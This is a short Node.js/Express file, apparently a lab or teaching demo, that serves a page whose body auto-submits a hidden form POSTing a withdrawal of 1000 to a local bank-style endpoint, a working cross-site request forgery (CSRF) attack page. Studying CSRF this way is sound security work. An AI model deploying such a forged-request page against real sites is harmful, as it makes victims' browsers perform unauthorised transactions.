var http = require('http');
var express = require('express');

var html = `
<body onload="document.forms[0].submit()">
<form action="http://localhost:3000/withdraw" method="POST">
    <input type="hidden" name="amount" value="1000"/>
</form>
`;

// <a href="http://csrf:3000/">http://localhost:3000</a>

// CSRF endpoint
var csrf = express();

csrf.get('/', function (req, res) {
    res.send(html);
});

http.createServer(csrf).listen(3001);
